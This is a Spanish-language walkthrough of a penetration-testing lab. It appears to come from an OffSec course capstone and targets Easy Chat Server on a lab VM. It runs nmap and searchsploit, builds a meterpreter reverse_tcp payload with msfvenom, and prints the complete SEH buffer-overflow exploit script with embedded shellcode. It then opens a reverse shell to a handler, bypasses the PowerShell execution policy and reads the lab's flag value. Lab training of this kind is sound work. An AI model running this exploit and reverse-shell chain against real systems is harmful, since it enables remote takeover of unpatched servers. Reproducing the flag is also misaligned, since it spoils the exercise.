# Walk : Fixing Exploits - Fixing Web Exploits - Module Exercise VM #3 

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
Capstone Lab: Enumerate the Module Exercise VM 3 and find the application that has a **memory corruption** vulnerability. 
Then find the related public exploit and fix it as illustrated in this Module.

## Herramientas
1. nmap 
2. shearchsploit

## Procedimiento y comandos

#### Paso 1: Enumeracion del obgetivo:
```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/03_Cap]
└─# nmap -sC -sV 192.168.167.213 -Pn -oN nmap-pn-scripts.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 16:41 -03
Nmap scan report for 192.168.167.213
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
20000/tcp open  http          Easy Chat Server httpd 1.0
|_http-server-header: Easy Chat Server/1.0
|_http-title: Easy Chat Server
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-18T19:42:28
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.34 seconds
```
#### Paso 2: Buscamos el exploit:
```bash
┌──(root㉿kali)-[/home/…/OffSec/14-FixingExploits/02-WebExploits/Capstones]
└─# searchsploit Easy Chat Server          
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Easy Chat Server 1.x - Multiple Denial of Service Vulnerabilities    | multiple/dos/24247.txt
Easy Chat Server 3.1 - 'message' Denial of Service (PoC)             | windows/dos/46806.py
Easy Chat Server 3.1 - 'message' Denial of Service (PoC)             | windows/dos/46806.py
Easy Chat Server 3.1 - Directory Traversal and Arbitrary File Read   | windows/webapps/50437.txt
Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)            | windows/remote/50999.py
EFS Easy Chat Server - Authentication Request Handling Buffer Overfl | windows/remote/16772.rb
EFS Easy Chat Server - Universal Buffer Overflow (SEH) (Metasploit)  | windows/remote/11210.rb
EFS Easy Chat Server 2.2 - Authentication Request Buffer Overflow    | windows/remote/8154.pl
EFS Easy Chat Server 2.2 - Authentication Request Buffer Overflow (S | windows/remote/8142.py
EFS Easy Chat Server 2.2 - Cross-Site Request Forgery (Change Admin  | windows/remote/8149.txt
EFS Easy Chat Server 2.2 - Remote Denial of Service                  | windows/dos/4289.php
EFS Easy Chat Server 3.1 - Password Disclosure                       | windows/webapps/42153.py
EFS Easy Chat Server 3.1 - Password Reset                            | windows/webapps/42154.py
EFS Easy Chat Server 3.1 - Remote Buffer Overflow (SEH)              | windows/remote/42155.py
EFS Easy Chat Server 3.1 - Remote Stack Buffer Overflow              | windows/remote/33326.py
EFS Software Easy Chat Server 2.2 - Remote Buffer Overflow           | windows/remote/11179.rb
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### Exploramos posibilidades con MSF

1. Configuramos el multi/handler:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > show options

Payload options (windows/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       192.168.45.213   yes       The listen address (an interface may be specified)
   LPORT       4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
```
2. Configuramos el backdoor:

```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/03_Cap]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.213 LPORT=4444 -f python -b "\x00\x20" -v shellcode > shellcode.py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Encoding failed due to a bad character (index=162, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with A key could not be found for the Call+4 Dword XOR Encoder encoder.
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a nil character
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with A key could not be found for the Variable-length Fnstenv/mov Dword XOR Encoder encoder.
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive failed with Encoding failed due to a bad character (index=1938, char=0x00)
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic succeeded with size 178312 (iteration=0)
x86/xor_dynamic chosen with final size 178312
Payload size: 178312 bytes
Final size of python file: 876719 bytes
```
3. Reemplazamos el payload(shellcode) del exploit **50999.py** 'shellcode = ""' por el obtenido de **msfvenom** y cabeceras
```bash
┌──(root㉿kali)-[/home/…/OffSec/14-FixingExploits/02-WebExploits/Capstones]
└─# xclip -selection clipboard < shellcode.py
```
* Con **nano**

```bash
#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * 217
nseh = pack("<L", 0x06eb9090)  # short jump 6 bytes
seh = pack("<L", 0x1001ae86)  # pop pop ret 1001AE86 SSLEAY32.DLL
# Salida de msfvenom
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f python -b "\x00\x20" -v shellcode > shellcode.py
shellcode = b"\x90" * 30
shellcode += b"\xba\x80\xe3\x3c\xf3\xdb\xde\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x59\x83\xc6\x04\x31\x56\x10"
shellcode += b"\x03\x56\x10\x62\x16\xc0\x1b\xed\xd9\x39\xdc"
shellcode += b"\x91\xe8\xeb\xb8\xda\x59\x3c\xc8\x39\xd6\x6e"
shellcode += b"\xc6\x4a\xbb\x9a\xe7\xb3\xb7\xd1\x2f\x44\x7f"
shellcode += b"\x5f\x16\x6b\xbf\xcc\x6a\xea\x43\x0f\xbf\xcc"
shellcode += b"\x7a\xc0\xb2\x0d\xba\x96\xb9\xe2\x16\xa2\x10"
shellcode += b"\xec\x1d\xf6\xa8\x5b\x23\x27\x5b\x23\x5b\x42"
shellcode += b"\x9c\xd7\xd7\x4d\xcd\x9c\xa0\x55\xbd\x29\x68"
shellcode += b"\x46\x3c\xfe\x0c\x4f\x4a\x3c\x3e\xaf\xfa\xb7"
shellcode += b"\x74\xc4\xfc\x11\x45\x1a\x3f\x52\xab\x36\xc1"
shellcode += b"\xab\x8c\xa6\xb7\xc7\xee\x5b\xc0\x1c\x8c\x87"
shellcode += b"\x45\x82\x36\x43\xfd\x66\xc6\x80\x98\xed\xc4"
shellcode += b"\x6d\xee\xa9\xc8\x70\x23\xc2\xf5\xf9\xc2\x04"
shellcode += b"\x7c\xb9\xe0\x80\x24\x19\x88\x91\x80\xcc\xb5"
shellcode += b"\xc1\x6d\xb0\x13\x8a\x9c\xa7\x24\x73\x5f\xc8"
shellcode += b"\x78\xe3\x93\x05\x83\xf3\xbb\x1e\xf0\xc1\x64"
shellcode += b"\xb5\x9e\x69\xec\x13\x58\xf8\xfa\xa3\xb6\x42"
shellcode += b"\x6a\x5a\x37\xb2\xa2\x99\x63\xe2\xdc\x08\x0c"
shellcode += b"\x69\x1d\xb4\xd9\x07\x17\x22\x22\x7f\x0a\x67"
shellcode += b"\xca\x7d\x55\x96\x57\x08\xb3\xc8\x37\x5a\x6c"
shellcode += b"\xa9\xe7\x1a\xdc\x41\xe2\x95\x03\x71\x0d\x7c"
shellcode += b"\x2c\x18\xe2\x28\x04\xb5\x9b\x71\xde\x24\x63"
shellcode += b"\xac\x9a\x67\xef\x44\x5a\x29\x18\x2d\x48\x5e"
shellcode += b"\x7f\xcd\x90\x9f\xea\xcd\xfa\x9b\xbc\x9a\x92"
shellcode += b"\xa1\x99\xec\x3c\x59\xcc\x6f\x3a\xa5\x91\x59"
shellcode += b"\x30\x90\x07\xe5\x2e\xdd\xc7\xe5\xae\x8b\x8d"
shellcode += b"\xe5\xc6\x6b\xf6\xb6\xf3\x73\x23\xab\xaf\xe1"
shellcode += b"\xcc\x9d\x1c\xa1\xa4\x23\x7a\x85\x6a\xdc\xa9"
shellcode += b"\x95\x6d\x22\x2f\xb2\xd5\x4a\xcf\x82\xe5\x8a"
shellcode += b"\xa5\x02\xb6\xe2\x32\x2c\x39\xc2\xbb\xe7\x12"
shellcode += b"\x4a\x31\x66\xd0\xeb\x46\xa3\xb4\xb5\x47\x40"
shellcode += b"\x6d\x46\x3d\x29\x92\xa7\xc2\x23\xf7\xa8\xc2"
shellcode += b"\x4b\x09\x95\x14\x72\x7f\xd8\xa4\xc1\x70\x6f"
shellcode += b"\x88\x60\x1b\x8f\x9e\x73\x0e"

buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.167.213:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.167.213\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")
```

> guardamos y ejecutamos con el receptor activo.

```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/03_Cap]
└─# python3 50999.py 192.168.167.213 20000
[*] Sending evil buffer...
[+] Done!
```
#### Receptor:

```msfconsole
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Sending stage (177734 bytes) to 192.168.167.213
[*] Meterpreter session 1 opened (192.168.45.213:4444 -> 192.168.167.213:50087) at 2025-06-19 09:38:31 -0300

meterpreter >

```
#### Obtenemos el flag:

1. `shell`
2. `powershell`
3. `powershell -ep bypass`
4. `Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

```powershell
    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         6/19/2025   8:13 AM             78 flag.txt  

PS C:\Users\Administrator\Desktop> type flag.txt
type flag.txt
OS{502c3980598c3353c606576d0abfc936}
PS C:\Users\Administrator\Desktop> 
```
